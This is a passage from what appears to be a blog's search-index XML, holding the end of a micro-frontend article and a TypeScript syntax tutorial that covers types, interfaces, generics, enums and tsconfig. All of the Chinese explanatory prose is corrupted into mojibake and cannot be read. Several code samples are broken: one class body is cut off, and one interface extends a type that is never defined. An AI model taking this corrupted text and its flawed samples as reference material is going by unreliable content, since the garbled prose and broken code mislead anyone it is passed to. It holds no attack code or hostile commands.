¡éªŒç™»å½•çŠ¶æ€ï¼Œä»è€Œä¿éšœä¸šåŠ¡ç³»ç»Ÿé—´ç”¨æˆ·å®‰å…¨è®¤è¯çš„ä¸€è‡´æ€§ã€‚</p></li><li><p><em>å¼•ç”¨å…¬å…±åº“</em><br>æ¯ä¸€ä¸ªä¸šåŠ¡å·¥ç¨‹éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å‰ç«¯å·¥ç¨‹ï¼Œæ‰€ä»¥é‡Œé¢ä¼šæœ‰ä¸€äº›ç›¸åŒçš„ä¾èµ–ï¼Œå¦‚ Vueã€momentã€lodash ç­‰ã€‚å¦‚æœå°†è¿™äº›å†…å®¹éƒ½æ‰“åŒ…åˆ°å„è‡ªçš„ vendor.js é‡Œï¼Œåˆ™åŠ¿å¿…ä¼šå¯¼è‡´ä»£ç å†—ä½™å¤ªå¤šï¼Œæµè§ˆå™¨è¿è¡Œå†…å­˜å‹åŠ›å¢å¤§ã€‚æˆ‘ä»¬æŠŠè¿™äº›å…¬å…±ä¾èµ–ã€å…¬å…±ç»„ä»¶ã€CSSã€Fonts ç­‰éƒ½æ”¾åˆ°ä¸€ä¸ªå·¥ç¨‹é‡Œï¼Œç”±è¯¥å·¥ç¨‹è¿›è¡Œæ‰“åŒ…ï¼Œå°†ä¾èµ–ã€ç»„ä»¶ exportï¼Œå¹¶ä»¥ UMD çš„æ–¹å¼æ³¨å…¥åˆ°å…¨å±€ã€‚</p></li></ul><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://juejin.im/post/5cadd7835188251b2f3a4bb0" target="_blank" rel="noopener">å¾®å‰ç«¯å®è·µ</a></li><li><a href="https://blog.csdn.net/lizhipeng123321/article/details/81868136" target="_blank" rel="noopener">å‰ç«¯å¾®æœåŠ¡æ•´åˆä¹‹â€˜â€˜æ’æ‹”å¼æ¶æ„â€™â€˜å®ç°æ–¹æ¡ˆ</a></li><li><a href="https://www.cnblogs.com/meituantech/p/9604591.html" target="_blank" rel="noopener">ç”¨å¾®å‰ç«¯çš„æ–¹å¼æ­å»ºç±»å•é¡µåº”ç”¨</a></li><li><a href="https://juejin.im/post/5b45d0ea6fb9a04fa42f9f1a" target="_blank" rel="noopener">å®æ–½å¾®å‰ç«¯çš„å…­ç§æ–¹å¼</a></li><li><a href="https://www.jianshu.com/p/1f409df7de45" target="_blank" rel="noopener">ã€Œå¾®å‰ç«¯ã€- å°†å¾®æœåŠ¡ç†å¿µæ‰©å±•åˆ°å‰ç«¯å¼€å‘ï¼ˆå®è·µç¯‡ï¼‰</a></li><li><a href="https://juejin.cn/post/7163481140165246983?searchId=202503242041583F9C65A0CFAD874C3E2C" target="_blank" rel="noopener">å¾®å‰ç«¯çš„å‰ä¸–ä»Šç”Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Typescriptè¯­æ³•</title>
      <link href="/2020/11/18/typescript/"/>
      <url>/2020/11/18/typescript/</url>
      <content type="html"><![CDATA[<h3 id="1-ä¸ºä»€ä¹ˆè¦ç”¨TypeScript"><a href="#1-ä¸ºä»€ä¹ˆè¦ç”¨TypeScript" class="headerlink" title="1. ä¸ºä»€ä¹ˆè¦ç”¨TypeScript"></a>1. ä¸ºä»€ä¹ˆè¦ç”¨TypeScript</h3><ul><li><p><em>éªŒè¯çº¦æŸã€ç”¨æ³•æç¤º</em><br>ç±»å‹æ˜¯äººä¸ºæ·»åŠ çš„ä¸€ç§ç¼–ç¨‹çº¦æŸå’Œç”¨æ³•æç¤ºã€‚ç›®çš„æ˜¯åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæä¾›è‡ªåŠ¨è¡¥å…¨ã€éªŒè¯æç¤º</p></li><li><p><em>å‡å°‘ä»£ç é‡æ„å¸¦æ¥çš„æœªçŸ¥å½±å“</em><br>Typescriptæœ‰åŠ©äºä»£ç é‡æ„ï¼Œå› ä¸ºä¸ç¡®å®šä¿®æ”¹åæ˜¯å¦ä¼šå½±å“åˆ°å…¶ä»–éƒ¨åˆ†çš„ä»£ç ã€‚ç±»å‹ä¿¡æ¯æ£€æŸ¥å¤§å¤§å‡è½»äº†é‡æ„çš„æˆæœ¬ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåªè¦å‡½æ•°æˆ–å¯¹è±¡çš„å‚æ•°å’Œè¿”å›å€¼ä¿æŒç±»å‹ä¸å˜ï¼Œå°±èƒ½åŸºæœ¬ç¡®å®šï¼Œé‡æ„åçš„ä»£ç ä¹Ÿèƒ½æ­£å¸¸è¿è¡Œã€‚</p></li></ul><p><br></p><h3 id="2-ç±»å‹å£°æ˜"><a href="#2-ç±»å‹å£°æ˜" class="headerlink" title="2. ç±»å‹å£°æ˜"></a>2. ç±»å‹å£°æ˜</h3><h4 id="2-1-åŸºæœ¬ç±»å‹"><a href="#2-1-åŸºæœ¬ç±»å‹" class="headerlink" title="2.1 åŸºæœ¬ç±»å‹"></a>2.1 åŸºæœ¬ç±»å‹</h4><p>ä¸º JavaScript å˜é‡åŠ ä¸Šäº†ç±»å‹å£°æ˜ã€‚ç±»å‹å£°æ˜å¹¶ä¸æ˜¯å¿…éœ€çš„ï¼Œå¦‚æœæ²¡æœ‰ï¼ŒTypeScript ä¼šè‡ªå·±æ¨æ–­ç±»å‹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name: string = <span class="string">'é™ˆçš®çš®'</span>;</span><br><span class="line">name = <span class="number">9527</span>; <span class="comment">// æŠ¥é”™</span></span><br></pre></td></tr></table></figure></p><ul><li><p>anyç±»å‹</p><ul><li><em><code>any</code></em>: æ²¡æœ‰ä»»ä½•é™åˆ¶</li><li><em><code>unknown</code></em>: è¡¨æ˜ç±»å‹ä¸ç¡®å®šï¼Œå¯ä»¥æ˜¯ä»»æ„ç±»å‹</li><li><em><code>never</code></em>: è¡¨ç¤ºä¸èƒ½èµ‹ç»™å®ƒä»»ä½•å€¼ï¼Œå¦åˆ™éƒ½ä¼šæŠ¥é”™<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fail</span>(<span class="params">msg:string</span>):<span class="title">never</span> </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>åŸºæœ¬ç±»å‹</p><ul><li><em><code>boolean</code></em></li><li><em><code>string</code></em></li><li><em><code>number</code></em>: æ‰€æœ‰æ•´æ•°å’Œæµ®ç‚¹æ•°</li><li><em><code>bigint</code></em>: æ‰€æœ‰å¤§æ•´æ•°</li><li><em><code>symbol</code></em></li><li><em><code>object</code></em>: åŒ…å«äº†æ‰€æœ‰å¯¹è±¡ã€æ•°ç»„å’Œå‡½æ•°</li><li><em><code>undefined</code></em> æœªå®šä¹‰</li><li><em><code>null</code></em> ç©ºå€¼</li><li><em><code>void</code></em> è¡¨ç¤ºå‡½æ•°æ²¡æœ‰è¿”å›å€¼</li></ul></li><li><p>è”åˆç±»å‹<br>ç¬¦åˆ A æˆ– B éƒ½è¡Œ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> bye: string | number;</span><br></pre></td></tr></table></figure></li><li><p>äº¤å‰ç±»å‹<br>å¿…é¡»åŒæ—¶å±äº A å’Œ B </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x: number &amp; string;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="2-2-æ•°ç»„"><a href="#2-2-æ•°ç»„" class="headerlink" title="2.2 æ•°ç»„"></a>2.2 æ•°ç»„</h4><p>å¦‚æœå˜é‡çš„åˆå§‹å€¼æ˜¯ç©ºæ•°ç»„ï¼Œé‚£ä¹ˆ TypeScript ä¼šæ¨æ–­æ•°ç»„ç±»å‹æ˜¯<code>any[]</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr:number[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">let</span> arr:(number|string)[];</span><br><span class="line"><span class="keyword">let</span> arr:<span class="built_in">Array</span>&lt;number|string&gt;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤šç»´æ•°ç»„</span></span><br><span class="line"><span class="keyword">const</span> multi:number[][] = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>]];</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-3-å…ƒç¥–"><a href="#2-3-å…ƒç¥–" class="headerlink" title="2.3 å…ƒç¥–"></a>2.3 å…ƒç¥–</h4><p>å…ƒç»„å¿…é¡»æ˜ç¡®å£°æ˜æ¯ä¸ªæˆå‘˜çš„ç±»å‹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> t:[number] = [<span class="number">1</span>];</span><br><span class="line"><span class="keyword">const</span> s:[string, string, boolean] = [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="literal">true</span>];</span><br><span class="line">type t1 = [string, number, ...boolean[]]; <span class="comment">// è¡¨ç¤ºæ•°ç»„ç¬¬ä¸‰ä¸ªå…ƒç´ å¼€å§‹åˆ°åé¢éƒ½æ˜¯boolean</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-å‡½æ•°"><a href="#2-4-å‡½æ•°" class="headerlink" title="2.4 å‡½æ•°"></a>2.4 å‡½æ•°</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params">txt:string</span>):<span class="title">void</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¯é€‰å‚æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x?:number</span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å‚æ•°é»˜è®¤å€¼</span></span><br><span class="line">function createPoint(x:number = 0, y:number = 0):[number, number] &#123;</span><br><span class="line">  <span class="keyword">return</span> [x, y];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-5-å¯¹è±¡"><a href="#2-5-å¯¹è±¡" class="headerlink" title="2.5 å¯¹è±¡"></a>2.5 å¯¹è±¡</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj:&#123; <span class="attr">x</span>:number; y:number; &#125; = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;;</span><br></pre></td></tr></table></figure><h4 id="2-6-ç±»"><a href="#2-6-ç±»" class="headerlink" title="2.6 ç±»"></a>2.6 ç±»</h4><h5 id="2-6-1-Implementså…³é”®å­—"><a href="#2-6-1-Implementså…³é”®å­—" class="headerlink" title="2.6.1 Implementså…³é”®å­—"></a>2.6.1 Implementså…³é”®å­—</h5><p>ç±»ä½¿ç”¨ implements å…³é”®å­—ï¼Œè¡¨ç¤ºå½“å‰ç±»æ»¡è¶³è¿™äº›å¤–éƒ¨ç±»å‹æ¡ä»¶çš„é™åˆ¶ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">type Country = &#123;</span><br><span class="line">  name:string;</span><br><span class="line">  capital:string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyCountry</span> <span class="title">implements</span> <span class="title">Country</span> </span>&#123;</span><br><span class="line">  name = <span class="string">''</span>;</span><br><span class="line">  capital</span><br></pre></td></tr></table></figure></p><h5 id="2-6-2-å¯è®¿é—®å±æ€§ä¿®é¥°ç¬¦"><a href="#2-6-2-å¯è®¿é—®å±æ€§ä¿®é¥°ç¬¦" class="headerlink" title="2.6.2 å¯è®¿é—®å±æ€§ä¿®é¥°ç¬¦"></a>2.6.2 å¯è®¿é—®å±æ€§ä¿®é¥°ç¬¦</h5><p><code>public</code> ä¿®é¥°ç¬¦è¡¨ç¤ºè¿™æ˜¯å…¬å¼€æˆå‘˜ï¼Œå¤–éƒ¨å¯ä»¥è‡ªç”±è®¿é—®<br><code>private</code> ç§æœ‰æˆå‘˜ï¼Œåªèƒ½ç”¨åœ¨å½“å‰ç±»çš„å†…éƒ¨ï¼Œç±»çš„å®ä¾‹å’Œå­ç±»éƒ½ä¸èƒ½ä½¿ç”¨è¯¥æˆå‘˜ã€‚<br><code>protected</code> ä¿æŠ¤æˆå‘˜ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨ä½¿ç”¨è¯¥æˆå‘˜ï¼Œå®ä¾‹æ— æ³•ä½¿ç”¨è¯¥æˆå‘˜ï¼Œä½†æ˜¯å­ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨ã€‚<br><code>static</code> é™æ€æˆå‘˜æ˜¯åªèƒ½é€šè¿‡ç±»æœ¬èº«ä½¿ç”¨çš„æˆå‘˜ï¼Œä¸èƒ½é€šè¿‡å®ä¾‹å¯¹è±¡ä½¿ç”¨ã€‚<br><code>abstract</code> è¯¥ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼Œåªèƒ½å½“ä½œå…¶ä»–ç±»çš„æ¨¡æ¿<br><code>readonly</code> ç”¨æ¥å®šä¹‰åªè¯»çš„å­—æ®µï¼Œä½¿å¾—å­—æ®µ åªèƒ½åœ¨åˆ›å»ºçš„æ—¶å€™èµ‹å€¼ä¸€æ¬¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">  public <span class="keyword">static</span> name = <span class="string">'é™ˆçš®çš®'</span>;</span><br><span class="line">  private secret = <span class="string">'*******'</span>;</span><br><span class="line">  protected password = <span class="string">'********'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br><br><br></p><h3 id="3-åŸºæœ¬è¯­æ³•"><a href="#3-åŸºæœ¬è¯­æ³•" class="headerlink" title="3. åŸºæœ¬è¯­æ³•"></a>3. åŸºæœ¬è¯­æ³•</h3><h4 id="3-1-åˆ«å-Type"><a href="#3-1-åˆ«å-Type" class="headerlink" title="3.1 åˆ«å Type"></a>3.1 åˆ«å Type</h4><p>ç”¨æ¥å®šä¹‰ä¸€ä¸ªç±»å‹çš„åˆ«åã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">type MyObj = &#123; <span class="comment">// ä¸ºå¯¹è±¡ç±»å‹å£°æ˜ä¸€ä¸ªåˆ«ä¹°é‚£ä¸ª</span></span><br><span class="line">  x:number;</span><br><span class="line">  y?:number; <span class="comment">// å¯é€‰å±æ€§</span></span><br><span class="line">  <span class="comment">// æ— æ³•å¾—çŸ¥äº‹å‰ä¼šæœ‰å¤šå°‘å±æ€§ï¼Œå…è®¸è¿™ç§å±æ€§åçš„ç´¢å¼•ç±»å‹</span></span><br><span class="line">  [property: string]: string;</span><br><span class="line">  [property: number]: number;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> obj:MyObj = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-æ¥å£-Interface-extends"><a href="#3-2-æ¥å£-Interface-extends" class="headerlink" title="3.2 æ¥å£ Interface, extends"></a>3.2 æ¥å£ Interface, extends</h4><p>interface æ˜¯å¯¹è±¡çš„æ¨¡æ¿ï¼Œå¯ä»¥çœ‹ä½œæ˜¯ä¸€ç§ç±»å‹çº¦å®šï¼Œä¸­æ–‡è¯‘ä¸ºâ€œæ¥å£â€ã€‚ä½¿ç”¨äº†æŸä¸ªæ¨¡æ¿çš„å¯¹è±¡ï¼Œå°±æ‹¥æœ‰äº†æŒ‡å®šçš„ç±»å‹ç»“æ„ã€‚<br>interface å¯ä»¥è¡¨ç¤ºå¯¹è±¡çš„å„ç§è¯­æ³•ï¼Œå®ƒçš„æˆå‘˜æœ‰5ç§å½¢å¼ã€‚</p><ul><li>å¯¹è±¡å±æ€§</li><li>å¯¹è±¡çš„å±æ€§ç´¢å¼•</li><li>å¯¹è±¡æ–¹æ³•</li><li>å‡½æ•°</li><li>æ„é€ å‡½æ•°</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface Human &#123;</span><br><span class="line">  name: string;</span><br><span class="line">  [prop: string]: number; <span class="comment">// å±æ€§ç´¢å¼•</span></span><br><span class="line">  readonly id: number; <span class="comment">// åªè¯»å±æ€§</span></span><br><span class="line">  hair?: number; <span class="comment">// å¯é€‰å±æ€§</span></span><br><span class="line">  run(): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>interfaceå¯ä»¥ç»§æ‰¿ï¼Œç›¸å½“äºå¤šä¸ªæ¥å£åˆå¹¶</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface Shape &#123;</span><br><span class="line">  name: string;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Circle extends Style, Shape &#123;</span><br><span class="line">  radius: number;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>Type å’Œ Interface çš„åŒºåˆ«ï¼Ÿ </em><br>å¾ˆå¤šå¯¹è±¡ç±»å‹æ—¢å¯ä»¥ç”¨ interface è¡¨ç¤ºï¼Œä¹Ÿå¯ä»¥ç”¨ type è¡¨ç¤ºã€‚<br>interface ä¸ type çš„åŒºåˆ«æœ‰ä¸‹é¢å‡ ç‚¹ã€‚</p><ul><li>typeèƒ½å¤Ÿè¡¨ç¤ºéå¯¹è±¡ç±»å‹ï¼Œè€Œinterfaceåªèƒ½è¡¨ç¤ºå¯¹è±¡ç±»å‹ï¼ˆåŒ…æ‹¬æ•°ç»„ã€å‡½æ•°ç­‰ï¼‰ã€‚</li><li>interfaceå¯ä»¥ç»§æ‰¿å…¶ä»–ç±»å‹ï¼Œtypeä¸æ”¯æŒç»§æ‰¿ã€‚</li></ul></li></ul><p><br></p><h4 id="3-3-æ³›å‹-Generics"><a href="#3-3-æ³›å‹-Generics" class="headerlink" title="3.3 æ³›å‹ Generics"></a>3.3 æ³›å‹ Generics</h4><p>æœ‰äº›æ—¶å€™ï¼Œå‡½æ•°è¿”å›å€¼çš„ç±»å‹ä¸å‚æ•°ç±»å‹æ˜¯ç›¸å…³çš„ã€‚<br><code>&lt;T&gt;</code>å¯ä»¥ç†è§£ä¸ºç±»å‹å£°æ˜éœ€è¦çš„å˜é‡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFirst</span>&lt;<span class="title">T</span>&gt;(<span class="params">arr:T[]</span>):<span class="title">T</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Nullable&lt;T&gt; = T | <span class="literal">undefined</span> | <span class="literal">null</span>;</span><br><span class="line">type Container&lt;T&gt; = &#123; <span class="attr">value</span>: T &#125;;</span><br><span class="line"><span class="keyword">const</span> a: Container&lt;number&gt; = &#123; <span class="attr">value</span>: <span class="number">0</span> &#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-4-æšä¸¾-enum"><a href="#3-4-æšä¸¾-enum" class="headerlink" title="3.4 æšä¸¾ enum"></a>3.4 æšä¸¾ enum</h4><p>éœ€è¦å®šä¹‰ä¸€ç»„ç›¸å…³çš„å¸¸é‡ã€‚Enum ç»“æ„é‡Œé¢åŒ…å«4ä¸ªæˆå‘˜ï¼Œä»–ä»¬çš„é»˜è®¤å€¼åˆ†åˆ«ä¸º0,1,2,3ã€‚ä½ å¯ä»¥ç»™å®ƒä»¬è®¾ç½®å…·ä½“å€¼<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum Direction &#123;</span><br><span class="line">    Up = <span class="number">1</span>,</span><br><span class="line">    Down = <span class="number">2</span>,</span><br><span class="line">    Left = <span class="number">3</span>,</span><br><span class="line">    Right = <span class="number">4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> direction: Direction = Direction.Up; <span class="comment">// 1</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-5-æ–­è¨€-as"><a href="#3-5-æ–­è¨€-as" class="headerlink" title="3.5 æ–­è¨€ as"></a>3.5 æ–­è¨€ as</h4><p>TypeScript ä¸€æ—¦å‘ç°å­˜åœ¨ç±»å‹æ–­è¨€ï¼Œå°±ä¸å†å¯¹è¯¥å€¼è¿›è¡Œç±»å‹æ¨æ–­ï¼Œè€Œæ˜¯ç›´æ¥é‡‡ç”¨æ–­è¨€ç»™å‡ºçš„ç±»å‹ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type T = <span class="string">'a'</span>|<span class="string">'b'</span>|<span class="string">'c'</span>;</span><br><span class="line"><span class="keyword">let</span> foo = <span class="string">'a'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bar:T = foo; <span class="comment">// æŠ¥é”™ï¼ŒåŸå› æ˜¯typescirptæ¨æ–­fooçš„ç±»å‹æ˜¯stringï¼Œç»™barå¤åˆ¶stringå°±æŠ¥é”™</span></span><br><span class="line"><span class="keyword">let</span> bar:T = foo <span class="keyword">as</span> T; <span class="comment">// æ­£ç¡®</span></span><br></pre></td></tr></table></figure></p><p>ç±»å‹æ–­è¨€å¹¶ä¸æ„å‘³ç€ï¼Œå¯ä»¥æŠŠæŸä¸ªå€¼æ–­è¨€ä¸ºä»»æ„ç±»å‹ã€‚<code>T</code>æœ€èµ·ç æ˜¯<code>foo(string)</code>çš„å­ç±»å‹</p><p><br></p><h4 id="3-6-import-export"><a href="#3-6-import-export" class="headerlink" title="3.6 import/export"></a>3.6 import/export</h4><p>TypeScript å…è®¸è¾“å‡ºå’Œè¾“å…¥ç±»å‹<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">type Bool = <span class="literal">true</span> | <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">export</span> &#123; Bool &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Bool &#125; <span class="keyword">from</span> <span class="string">'./a'</span>;</span><br><span class="line"><span class="keyword">let</span> foo:Bool = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-7-å‘½åç©ºé—´-namespace"><a href="#3-7-å‘½åç©ºé—´-namespace" class="headerlink" title="3.7 å‘½åç©ºé—´ namespace"></a>3.7 å‘½åç©ºé—´ namespace</h4><p>è‡ªä»èƒ½ <code>import/export</code>åï¼Œå®˜æ–¹å·²ç»ä¸æ¨èä½¿ç”¨ <code>namespace</code> äº†ã€‚<br>namespace ç”¨æ¥å»ºç«‹ä¸€ä¸ªå®¹å™¨ï¼Œå†…éƒ¨çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°ï¼Œéƒ½å¿…é¡»åœ¨è¿™ä¸ªå®¹å™¨é‡Œé¢ä½¿ç”¨ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shapes.ts</span></span><br><span class="line"><span class="keyword">export</span> namespace Shapes &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Triangle</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Shapes &#125; <span class="keyword">from</span> <span class="string">'./shapes'</span>;</span><br><span class="line"><span class="keyword">let</span> t = <span class="keyword">new</span> Shapes.Triangle();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-d-ts-å£°æ˜æ–‡ä»¶"><a href="#4-d-ts-å£°æ˜æ–‡ä»¶" class="headerlink" title="4. d.ts å£°æ˜æ–‡ä»¶"></a>4. d.ts å£°æ˜æ–‡ä»¶</h3><p><code>d.ts</code>æ–‡ä»¶ï¼Œä¼šè‡ªåŠ¨å°†ç±»å‹å£°æ˜æ–‡ä»¶åŠ å…¥ç¼–è¯‘ï¼Œä¸ç”¨æ‰‹åŠ¨import<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// types.d.ts</span></span><br><span class="line"><span class="keyword">export</span> interface Character &#123;</span><br><span class="line">  catchphrase?: string;</span><br><span class="line">  name: string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="5-æ³¨é‡ŠæŒ‡ä»¤"><a href="#5-æ³¨é‡ŠæŒ‡ä»¤" class="headerlink" title="5. æ³¨é‡ŠæŒ‡ä»¤"></a>5. æ³¨é‡ŠæŒ‡ä»¤</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @ts-nocheck</span></span><br><span class="line"><span class="comment">// ä¸å¯¹å½“å‰è„šæœ¬è¿›è¡Œç±»å‹æ£€æŸ¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// @ts-check</span></span><br><span class="line"><span class="comment">// å¯¹è¯¥è„šæœ¬è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œä¸è®ºæ˜¯å¦å¯ç”¨äº†checkJsç¼–è¯‘é€‰é¡¹</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// @ts-ignore</span></span><br><span class="line"><span class="comment">// ä¸å¯¹ä¸‹ä¸€è¡Œä»£ç è¿›è¡Œç±»å‹æ£€æŸ¥</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-tsconfig-json"><a href="#6-tsconfig-json" class="headerlink" title="6. tsconfig.json"></a>6. tsconfig.json</h3><p>tsconfig.jsonæ˜¯ TypeScript é¡¹ç›®çš„é…ç½®æ–‡ä»¶ï¼Œæ”¾åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ã€‚</p><ul><li>includeï¼šæŒ‡å®šå“ªäº›æ–‡ä»¶éœ€è¦ç¼–è¯‘</li><li>exclude: ä»ç¼–è¯‘åˆ—è¡¨ä¸­å»é™¤æŒ‡å®šçš„æ–‡ä»¶<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"include"</span>: [<span 